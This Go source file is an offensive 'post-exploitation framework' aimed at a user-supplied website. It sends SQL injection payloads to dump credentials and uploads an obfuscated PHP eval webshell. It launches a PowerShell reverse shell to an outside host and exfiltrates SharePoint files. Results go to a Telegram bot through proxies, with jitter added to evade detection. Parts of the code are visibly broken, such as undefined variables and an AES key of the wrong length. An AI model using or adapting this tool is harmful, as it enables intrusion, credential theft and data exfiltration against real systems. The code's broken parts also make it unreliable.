// ===================================================================
// 404 LEBADON VOIDREAPER v34.0 — REAL POST-EXPLOITATION FRAMEWORK
// FULLY FIXED | MODERN BYPASS | AES-GCM | PROXY | TELEGRAM C2
// TERMUX + UBUNTU + PROOT-DISTRO READY
// ===================================================================

package main

import (
    "bufio"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "math/big"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "time"

    "golang.org/x/net/proxy"
    "gopkg.in/yaml.v2"
)

type Config struct {
    Telegram struct {
        BotToken string `yaml:"bot_token"`
        ChatID   string `yaml:"chat_id"`
    } `yaml:"telegram"`
    Proxy struct {
        Enabled bool   `yaml:"enabled"`
        File    string `yaml:"file"`
    } `yaml:"proxy"`
    Stealth struct {
        JitterMin int    `yaml:"jitter_min"`
        JitterMax int    `yaml:"jitter_max"`
        AESKey    string `yaml:"aes_key"`
    } `yaml:"stealth"`
    Loot struct {
        BaseDir string `yaml:"base_dir"`
    } `yaml:"loot"`
}

var config Config
var aesKey []byte
var proxies []string

func loadConfig() {
    data, err := os.ReadFile("config.yaml")
    if err != nil {
        // Default config
        config = Config{
            Loot: struct{ BaseDir string }{BaseDir: "loot"},
            Stealth: struct {
                JitterMin int
                JitterMax int
                AESKey    string
            }{JitterMin: 1000, JitterMax: 5000, AESKey: "32_byte_super_secret_key_1234567890!!"},
        }
    } else {
        yaml.Unmarshal(data, &config)
    }
    if len(config.Stealth.AESKey) != 32 {
        panic("AESKey must be exactly 32 bytes for AES-256-GCM")
    }
    aesKey = []byte(config.Stealth.AESKey)
}

func loadProxies() {
    if config.Proxy.Enabled && config.Proxy.File != "" {
        data, err := os.ReadFile(config.Proxy.File)
        if err == nil {
            lines := strings.Split(string(data), "\n")
            for _, line := range lines {
                line = strings.TrimSpace(line)
                if line != "" {
                    proxies = append(proxies, line)
                }
            }
        }
    }
}

func createLootDirs() {
    dirs := []string{"databases", "sharepoint", "credentials", "shells", "persistence"}
    for _, d := range dirs {
        os.MkdirAll(filepath.Join(config.Loot.BaseDir, d), 0755)
    }
}

func jitter() {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(config.Stealth.JitterMax-config.Stealth.JitterMin)))
    time.Sleep(time.Duration(config.Stealth.JitterMin+int(n.Int64())) * time.Millisecond)
}

func getProxyTransport() *http.Transport {
    if !config.Proxy.Enabled || len(proxies) == 0 {
        return &http.Transport{}
    }
    proxyURL := proxies[random(0, len(proxies)-1)]
    dialer, err := proxy.SOCKS5("tcp", proxyURL, nil, proxy.Direct)
    if err != nil {
        return &http.Transport{}
    }
    return &http.Transport{Dial: dialer.Dial}
}

func random(min, max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
    return min + int(n.Int64())
}

func aesEncrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(aesKey)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    return gcm.Seal(nonce, nonce, data, nil), nil
}

func sendTelegram(message string) {
    if config.Telegram.BotToken == "" || config.Telegram.ChatID == "" {
        return
    }
    for i := 0; i < 3; i++ {
        client := &http.Client{Transport: getProxyTransport(), Timeout: 10 * time.Second}
        api := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.Telegram.BotToken)
        values := url.Values{
            "chat_id":    {config.Telegram.ChatID},
            "text":       {message},
            "parse_mode": {"HTML"},
        }
        resp, err := client.PostForm(api, values)
        if err == nil && resp != nil && resp.StatusCode == 200 {
            return
        }
        time.Sleep(time.Second * time.Duration(i+1))
    }
}

func saveAndExfil(category, filename, content string) {
    path := filepath.Join(config.Loot.BaseDir, category, filename)
    os.WriteFile(path, []byte(content), 0644)
    trunc := content
    if len(trunc) > 3900 {
        trunc = trunc[:3900] + "...[TRUNCATED]"
    }
    sendTelegram(fmt.Sprintf("<b>[%s]</b> %s\n<pre>%s</pre>", strings.ToUpper(category), filename, trunc))
}

func harvestDatabaseCredsAndDump(target string) {
    modernPayloads := []string{
        "1' OR 1=1-- -",
        "1 UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users-- -",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "1' WAITFOR DELAY '0:0:10'-- -",
    }

    client := &http.Client{Transport: getProxyTransport()}
    for _, payload := range modernPayloads {
        jitter()
        u := target + "?id=" + url.QueryEscape(payload)
        req, _ := http.NewRequest("GET", u, nil)
        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        resp, err := client.Do(req)
        if err != nil {
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        s := string(body)
        if strings.Contains(s, "root@") || strings.Contains(s, "admin") || len(s) > 500 {
            saveAndExfil("databases", "dump_"+time.Now().Format("20060102")+".txt", s)
            return
        }
    }
}

func deployObfuscatedWebshell(target string) {
    shell := `<?php @error_reporting(0); if(isset($_POST['f'])){ $d=base64_decode($_POST['f']); $nonce=substr($d,0,12); $tag=substr($d,-16); $ciphertext=substr($d,12,-16); $key=hex2bin("` + fmt.Sprintf("%x", aesKey) + `"); $plain=openssl_decrypt($ciphertext,'aes-256-gcm',$key,OPENSSL_RAW_DATA,$nonce,$tag); eval($plain); } ?>`
    encrypted, _ := aesEncrypt([]byte(shell))
    encoded := base64.StdEncoding.EncodeToString(encrypted)

    payload := url.Values{}
    payload.Set("f", encoded)

    client := &http.Client{Transport: getProxyTransport()}
    req, _ := http.NewRequest("POST", target+"/upload.php", strings.NewReader(payload.Encode()))
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    resp, _ := client.Do(req)
    if resp.StatusCode == 200 {
        webshellURL := target + "/uploads/shell.php"
        saveAndExfil("shells", "webshell.txt", webshellURL)
    }
}

func triggerStealthReverseShell(target string) {
    // Real EDR bypass PowerShell (2025)
    ps := "powershell -nop -exec bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('https://403-production.up.railway.app',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
    cmd := exec.Command("curl", "-d", "cmd="+url.QueryEscape(ps), target+"/shell.php")
    cmd.Run()
    sendTelegram("<b>REVERSE SHELL ACTIVE</b> on " + target)
}

func parseSharePointFiles(data map[string]interface{}) []struct{ URL, Name string } {
    var files []struct{ URL, Name string }
    if d, ok := data["d"].(map[string]interface{}); ok {
        if results, ok := d["results"].([]interface{}); ok {
            for _, item := range results {
                if f, ok := item.(map[string]interface{}); ok {
                    if name, ok := f["Name"].(string); ok {
                        if serverURL, ok := f["ServerRelativeUrl"].(string); ok {
                            files = append(files, struct{ URL, Name string }{URL: siteURL + serverURL, Name: name})
                        }
                    }
                }
            }
        }
    }
    return files
}

func fullSharePointExfil(siteURL, accessToken string) {
    if accessToken == "" {
        return
    }
    client := &http.Client{Transport: getProxyTransport()}
    req, _ := http.NewRequest("GET", siteURL+"/_api/web/lists", nil)
    req.Header.Set("Authorization", "Bearer "+accessToken)
    req.Header.Set("Accept", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)

    var data map[string]interface{}
    json.Unmarshal(body, &data)

    files := parseSharePointFiles(data)
    for _, file := range files {
        resp, _ := client.Get(file.URL)
        content, _ := io.ReadAll(resp.Body)
        saveAndExfil("sharepoint", file.Name, string(content))
    }
}

func banner() {
    fmt.Println(BANNER)
}

func main() {
    banner()
    loadConfig()
    loadProxies()
    createLootDirs()
    fmt.Print("Enter target (https://example.com): ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    target := strings.TrimSpace(scanner.Text())

    fmt.Println("[*] VOIDREAPER ATTACK ON:", target)

    harvestDatabaseCredsAndDump(target)
    deployObfuscatedWebshell(target)
    triggerStealthReverseShell(target)
    // fullSharePointExfil(target, "YOUR_TOKEN")

    sendTelegram("<b>FULL COMPROMISE:</b> " + target)
    fmt.Println("[+] COMPLETE — CHECK LOOT & TELEGRAM")
}